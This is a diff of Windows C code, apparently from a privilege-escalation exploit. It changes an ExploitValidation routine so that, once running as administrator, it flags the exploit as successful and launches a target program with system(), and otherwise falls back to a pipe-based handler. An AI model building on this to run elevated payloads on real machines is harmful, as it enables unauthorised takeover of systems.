@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 
-
+#include "PipeClient.h"
 
 ///////////////////////// Registry //////////////////////////
 //
@@ -64,15 +64,17 @@ BOOL IsRunAsAdmin() {
 }
 
 BOOL ExploitValidation(BOOL fIsRunAsAdmin, HMODULE hModule) {
+
+	
+
 	if (fIsRunAsAdmin) {
 		char* currentPath = NULL;
 		if (GetTargetPath(&currentPath)) {
 			SetExploitSuccessed();
 			system(currentPath);
 			free(currentPath);
-		}
-
-		//system("cmd.exe");
+		}else
+			return PipeHandler(fIsRunAsAdmin);
 	}
 	return FALSE;
 }
